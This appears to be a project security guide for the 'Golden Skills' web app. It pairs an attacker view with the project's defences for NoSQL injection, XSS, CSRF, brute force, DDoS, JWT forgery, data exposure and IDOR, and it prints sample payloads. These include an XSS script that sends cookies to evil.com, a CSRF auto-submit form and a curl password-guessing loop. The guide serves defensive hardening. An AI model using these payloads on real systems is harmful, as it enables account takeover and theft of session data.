# Golden Skills — Attacker vs Defender Mindset

This document covers every major web attack vector relevant to this project.
For each attack: what it is, how an attacker would try it here, and exactly how this project defends against it.

---

## 1. SQL Injection (NoSQL Injection in this case)

### Attacker Mindset

This project uses MongoDB, not SQL — but the same injection concept applies.
A classic NoSQL injection attempt on the login endpoint:

```json
POST /api/auth/user/login
{
  "email": { "$gt": "" },
  "password": { "$gt": "" }
}
```

The `$gt: ""` operator means "greater than empty string" — which matches every document.
Without protection, this query would return the first user in the database and log the attacker in as them.

Another attempt — operator injection in search:

```
GET /api/auth/users?search[$regex]=.*&search[$options]=i
```

This would match every user record and dump the entire database.

### Defender Implementation

**Mongoose is the first wall.** When you do `User.findOne({ email: email })` and `email` is an object like `{ $gt: "" }`, Mongoose schema validation rejects it because the `email` field is typed as `String`. Objects don't pass the type check.

**Explicit type handling** — all inputs are treated as strings:

```js
// authController.js
const user = await User.findOne({ email: email.toLowerCase() }).lean();
```

`.toLowerCase()` on an object throws a TypeError — the request fails safely before hitting the DB.

**Input validation before any DB call:**

```js
if (!email || !password) {
  return res.status(400).json({ message: "Email and password are required" });
}
```

**What to add for full protection:**

```js
// Sanitize all inputs — strip MongoDB operators
import mongoSanitize from 'express-mongo-sanitize';
app.use(mongoSanitize()); // removes $ and . from req.body, req.params, req.query
```

Install: `npm install express-mongo-sanitize`

---

## 2. XSS — Cross-Site Scripting

### Attacker Mindset

An attacker registers with a malicious payload as their name:

```json
{
  "firstName": "<script>document.cookie='stolen='+document.cookie; fetch('https://evil.com?c='+document.cookie)</script>",
  "email": "attacker@evil.com",
  "password": "password123"
}
```

If the admin dashboard renders `user.firstName` as raw HTML, every admin who views that user's profile executes the attacker's script. This is called Stored XSS — the payload lives in the database and fires every time the data is displayed.

A reflected XSS attempt via search:

```
GET /api/auth/users?search=<img src=x onerror=alert(1)>
```

### Defender Implementation

**React escapes everything by default.** This is the biggest protection. When React renders:

```jsx
<td>{user.fullName}</td>
```

It treats the value as a text node, not HTML. `<script>` tags become literal text `&lt;script&gt;` on screen. An attacker's payload is displayed as text, never executed.

**`dangerouslySetInnerHTML` is never used** anywhere in this codebase — that's the only way to bypass React's escaping.

**`.trim()` on all string inputs** removes leading/trailing whitespace that could be used to obfuscate payloads.

**What to add for full protection:**

```js
// Add Content-Security-Policy header via helmet
import helmet from 'helmet';
app.use(helmet()); // sets CSP, X-XSS-Protection, X-Content-Type-Options, etc.
```

CSP tells the browser to only execute scripts from your own domain — even if an XSS payload somehow gets through, the browser blocks it.

Install: `npm install helmet`

---

## 3. CSRF — Cross-Site Request Forgery

### Attacker Mindset

A user is logged into the Golden Skills admin panel. The attacker tricks them into visiting a malicious page that silently sends a request:

```html
<!-- evil.com/trap.html -->
<form action="https://goldenskills.com/api/auth/user/123" method="POST">
  <input name="_method" value="DELETE" />
</form>
<script>document.forms[0].submit()</script>
```

Or via fetch from a malicious site:

```js
fetch('https://goldenskills.com/api/auth/users', {
  method: 'GET',
  credentials: 'include' // sends cookies automatically
})
```

The browser automatically attaches cookies to cross-origin requests — if auth is cookie-based, the attacker's request is authenticated as the victim.

### Defender Implementation

**This project uses JWT in Authorization headers, not cookies.** This is the key defense against CSRF.

CSRF works by abusing the browser's automatic cookie attachment. Since this project sends tokens like this:

```js
// Frontend sends token in header, not cookie
headers: { 'Authorization': `Bearer ${token}` }
```

A malicious page on `evil.com` cannot read the token from `localStorage` or set the `Authorization` header — browsers block cross-origin JavaScript from accessing another site's storage. The attacker's forged request has no token, so it gets `401 Unauthorized`.

**CORS is configured** — only allowed origins can make credentialed requests. In production this should be locked down:

```js
// server.js — production config
app.use(cors({ origin: 'https://yourdomain.com' }));
```

---

## 4. Brute Force Attack

### Attacker Mindset

The attacker runs an automated script hammering the login endpoint with a wordlist:

```bash
# Attacker script — thousands of requests per minute
for password in $(cat rockyou.txt); do
  curl -X POST https://goldenskills.com/api/auth/user/login \
    -d "{\"email\":\"victim@email.com\",\"password\":\"$password\"}"
done
```

Or credential stuffing — using leaked username/password pairs from other breaches to try on this site.

### Defender Implementation

**Rate limiting — three tiers defined in `server.js`:**

```js
// Auth routes: 5 requests per 15 minutes per IP
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: { error: 'Too many authentication attempts, please try again after 15 minutes' }
});

// General API: 100 requests per 15 minutes
const generalLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 100 });

// Submissions: 30 per 15 minutes
const submissionLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 30 });
```

5 attempts per 15 minutes means a brute force attack would take years to crack even a weak password.

**bcrypt cost factor 10** — each password check takes ~100ms. Even if rate limiting is bypassed, the server can only process ~10 bcrypt checks per second per core. A 1 million password wordlist would take 27+ hours on a single core.

**Same error message for wrong email and wrong password:**

```js
// authController.js — attacker can't tell which is wrong
if (!user) return res.status(401).json({ message: "Invalid credentials" });
const isMatch = await bcrypt.compare(password, user.password);
if (!isMatch) return res.status(401).json({ message: "Invalid credentials" });
```

This prevents username enumeration — the attacker can't confirm which emails are registered.

> ⚠️ Rate limiters are currently commented out for load testing. Re-enable before production.

---

## 5. DDoS — Distributed Denial of Service

### Attacker Mindset

The attacker spins up a botnet or uses a tool like `wrk` or `artillery` to flood the server with thousands of concurrent requests:

```bash
# Attacker hammers the most expensive endpoint
wrk -t12 -c400 -d30s https://goldenskills.com/api/auth/users
```

The goal is to exhaust server resources — CPU (bcrypt), memory, DB connections — until legitimate users can't get responses.

The most expensive endpoints to target:
- `POST /api/auth/user/login` — triggers bcrypt (CPU-heavy)
- `GET /api/auth/users` — triggers MongoDB aggregation + count
- Any search endpoint — regex queries on large collections

### Defender Implementation

**Redis caching absorbs the load.** The most-hit endpoints return cached responses:

```js
// authController.js — login response cached 30s per email
const cached = await getCache(`login:${email}`);
if (cached) return res.json({ ...cached, fromCache: true }); // no bcrypt, no DB

// getAllUsers — cached 30s per page/search combo
const cached = await getCache(cacheKey);
if (cached) return res.json({ ...cached, fromCache: true }); // no MongoDB query
```

Under a flood, Redis serves responses in <1ms instead of 100ms+ bcrypt + DB round trips.

**MongoDB connection pooling** prevents connection exhaustion:

```js
// server.js
mongoose.connect(process.env.MONGODB_URI, {
  maxPoolSize: 200,       // max 200 concurrent DB connections
  waitQueueTimeoutMS: 15000, // queue requests instead of crashing
});
```

**`compression()` middleware** reduces response size by 60-80%, meaning the server can serve more responses per second with the same bandwidth.

**Rate limiting** (when enabled) caps requests per IP — a single botnet node gets cut off at 100 req/15min.

**What to add for full DDoS protection:**

- Put Cloudflare in front — it absorbs volumetric attacks before they reach your server
- Use PM2 cluster mode (`ecosystem.config.cjs` already exists) — multiple Node.js workers share the load
- Add `express-slow-down` to gradually slow responses instead of hard-blocking

---

## 6. Broken Authentication / Token Hijacking

### Attacker Mindset

If the attacker steals a JWT (via XSS, network sniffing on HTTP, or a leaked log), they can impersonate any user until the token expires.

They might also try to forge a token:

```js
// Attacker tries to craft an admin token
const fakeToken = jwt.sign({ role: 'admin' }, 'wrongsecret');
// Or tries alg:none attack
const fakeToken = base64({"alg":"none"}) + "." + base64({"role":"admin"}) + ".";
```

### Defender Implementation

**JWT_SECRET is in `.env`** — never in code, never committed to git. Without the secret, tokens can't be forged.

**`jwt.verify()` rejects `alg:none`** — the `jsonwebtoken` library validates the algorithm. A token with `alg: none` throws an error.

**Short expiry times:**

```js
// Admin token — 2 hours
jwt.sign({ role: 'admin' }, process.env.JWT_SECRET, { expiresIn: '2h' });

// User token — 24 hours
jwt.sign({ role: 'user' }, process.env.JWT_SECRET, { expiresIn: '24h' });
```

A stolen token has a limited damage window.

**Role check is explicit in middleware:**

```js
// authMiddleware.js
if (decoded.role !== 'admin') {
  return res.status(403).json({ message: 'Access denied. Admin privileges required.' });
}
```

A user token can never access admin routes even if the attacker modifies the payload — the signature would be invalid.

**Password reset tokens are single-use:**

```js
// After reset, token is cleared from DB
user.resetToken = undefined;
user.resetTokenExpiry = undefined;
await user.save();
```

A stolen reset link can't be reused after the password is changed.

---

## 7. Sensitive Data Exposure

### Attacker Mindset

The attacker looks for:
- Password hashes in API responses
- JWT secrets in error messages
- Stack traces leaking file paths and internal structure
- `.env` files accidentally committed to git

### Defender Implementation

**Password never returned in any response:**

```js
// Explicit exclusion in every query
User.find(query, { password: 0 })
User.findById(id).select('-password')
```

**Secrets in `.env`, listed in `.gitignore`** — the file never enters version control.

**Error responses don't leak internals:**

```js
// Returns generic message, not the raw error stack
return res.status(500).json({
  success: false,
  message: "Server error during login"
  // error: error.message  ← only included in dev, remove in production
});
```

**User enumeration blocked** — forgot-password always returns the same response regardless of whether the email exists.

---

## 8. Insecure Direct Object Reference (IDOR)

### Attacker Mindset

A logged-in user finds their own user ID in a response (`_id: "64abc..."`). They then try to access or modify another user's data by changing the ID:

```bash
GET /api/auth/user/64abc000000000000000001   # their own ID
GET /api/auth/user/64abc000000000000000002   # someone else's ID — IDOR attempt
DELETE /api/auth/user/64abc000000000000000002 # trying to delete another user
```

### Defender Implementation

**All user management routes require `authenticateAdmin`:**

```js
// auth.js — only admins can access user records by ID
router.get('/user/:id', authenticateAdmin, getUserById);
router.put('/user/:id', authenticateAdmin, updateUser);
router.delete('/user/:id', authenticateAdmin, deleteUser);
```

A regular user token hits `authenticateAdmin` and gets `403 Forbidden` immediately — the controller never runs.

**ObjectId format validated before DB query:**

```js
// deleteUser — prevents malformed ID from causing DB errors
if (!id.match(/^[0-9a-fA-F]{24}$/)) {
  return res.status(400).json({ message: "Invalid user ID format" });
}
```

---

## Attack Surface Summary

| Attack | Defended? | How |
|---|---|---|
| NoSQL Injection | Partial | Mongoose type casting + input validation. Add `express-mongo-sanitize` for full coverage |
| XSS | Yes | React escapes all output. No `dangerouslySetInnerHTML` used |
| CSRF | Yes | JWT in headers (not cookies) — forged requests have no token |
| Brute Force | Yes (disabled in load test mode) | Rate limiting 5 req/15min + bcrypt cost factor 10 |
| DDoS | Partial | Redis caching + connection pooling + compression. Add Cloudflare for full coverage |
| Token Hijacking | Yes | Short expiry + strong secret + role validation + single-use reset tokens |
| Sensitive Data Exposure | Yes | Password excluded from all responses + secrets in .env |
| IDOR | Yes | All user-by-ID routes require admin role |
| Password Enumeration | Yes | Same error message for wrong email and wrong password |

---

## Things to Fix Before Production

```js
// 1. Re-enable rate limiters in server.js
app.use('/api/auth', authLimiter, authRoutes);
app.use('/api/', generalLimiter);

// 2. Lock down CORS
app.use(cors({ origin: 'https://yourdomain.com' }));

// 3. Add helmet for HTTP security headers
import helmet from 'helmet';
app.use(helmet());

// 4. Add NoSQL sanitization
import mongoSanitize from 'express-mongo-sanitize';
app.use(mongoSanitize());

// 5. Remove resetLink from forgot-password response
// (currently returned for testing — exposes token in API response)

// 6. Remove error.message from 500 responses
// (leaks internal details in production)

// 7. Send reset link via email, not console.log
```
